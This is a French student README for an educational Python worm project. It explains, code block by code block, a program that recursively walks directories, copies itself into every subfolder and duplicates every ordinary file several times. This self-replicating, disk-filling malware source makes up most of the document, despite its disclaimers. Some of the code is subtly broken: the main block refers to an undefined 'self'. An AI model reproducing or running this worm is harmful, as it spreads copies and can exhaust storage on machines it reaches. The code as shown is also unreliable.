![Logo](https://upload.wikimedia.org/wikipedia/commons/thumb/f/f8/Python_logo_and_wordmark.svg/2560px-Python_logo_and_wordmark.svg.png)

**Python-vers** est un projet issu d'un cours d'1,5 jours. Il est très fortement inspiré de l'article de [Shanto Roy](https://shantoroy.com/security/write-a-worm-malware-in-python/).

> **Il s'agit d'un programme à portée éducative uniquement et ne doit être utilisé que comme tel sur du matériel appartenant à l'utilisateur.**

# Description du projet

## Etat d'avancement du projet

- [x] Fonction de saisies des paramètres & attribution de valeurs par défaut
- [x] Listing des répertoires et sous-répertoires
- [x] Réplication du virus   
- [x] Réplication des fichiers présents dans le dossier
- [ ] Découverte des chemins réseau non sécurisés (SMBv1)
- [ ] Création d'un payload stylé 


## Dépendances du projet


# Utilisation
## Prérequis
### Préparation de l'environnement de travail
Il est fortement recommandé d'exécuter ce programme dans une machine virtuelle.

- Création d'un environnement virtuel: ```python -m venv env```

- Activation de cet environnement virtuel: ```./env/Scripts/activate```

## Exécution

Le programme s'exécute en saisissant ```python virus.py```.

# Déconstruction du code

```python 
if isinstance(path, type(None)):
    self.path ="/"
else:
    self.path = path

if isinstance(listOfTargetDirs, type(None)):
    self.listOfTargetDirs = []
else:
    self.listOfTargetDirs = listOfTargetDirs

if isinstance(iteration, type (None)):
    self.iteration = 1
else:
    self.iteration = iteration

self.currentPath = os.path.realpath(__file__)
``` 
> Vérififcation de la présence ou non via ```isinstance()``` de paramètres passés par l'utilisateur lors de l'appel de la fonction, sinon attribution de valeurs par défaut

```python 
def func_listDirs(self, path):
    self.listOfTargetDirs.append(path)
    filesInCurrentDir = os.listdir(path)
    for file in filesInCurrentDir:
            if not file.startswith('.'):
                absolutePath = os.path.join(path, file)

                if os.path.isdir(absolutePath):
                    self.func_listDirs(absolutePath)
                else:
                    pass
```
> Ajout au tableau ```listOfTargetDirs``` du répertoire passé par l'utilisateur lors de l'appel de la fonction puis listing des fichiers contenus dans ce répertoire.

> Pour toute entrée dans ce répertoire, s'il nest pas caché (commence par un ```.```), on stock son chemin absolu dans la variable ```absolutePath``` et si c'est un dossier on liste son contenu, etc...

```python
def func_createWorm(self):
    for directory in self.listOfTargetDirs:
        destination = os.path.join(directory, "worm.py")
        shutil.copyfile(self.currentPath, destination)
```
> Se charge de copier le ver dans tout dossier ou sous-dossier de la destination

```python
def func_copyExistingFiles(self):
    for directory in self.listOfTargetDirs:
        filesInDir = os.listdir(directory)
        for file in filesInDir:
            absolutePath = os.path.join(directory, file)
            if not absolutePath.startswith('.') and not os.path.isdir(absolutePath):
                sourceDir = absolutePath
                for i in range(self.iteration):
                    destination = os.path.join(directory,(file + str(i)))
                    shutil.copyfile(sourceDir, destination)
```
> Fait la même chose que ```func_createWorm``` mais duplique ```x``` fois tous les autres fichiers sauf les fichiers cachés. 

```python
if __name__ == "__main__":
    currentDirectory = os.path.abspath(r"C:\Users\brill\Desktop\test")
    worm = Ver(path = currentDirectory, iteration = 8)
    worm.func_listDirs(self.path)
    worm.func_createWorm()
    worm.func_copyExistingFiles()
```
> Défini le dossier à infecter puis exécute les trois fonctions de listing récursif, de copie du ver et de duplication des fichiers. 

# Crédits
## Auteur

Par François B, étudiant à l'école IPSSI en première année de master Cybersécurité & cloud-computing

Merci à Christian A, enseignants chercheurs

Merci à [Shanto Roy (GitHub)](https://github.com/shantoroy)

## Licence

Ce programme a été créé dans un but purement éducatif et n'est soumis en tant que tel à aucune licence.
Les licences des bibliothèques et interprêteurs utilisés s'appliquent.


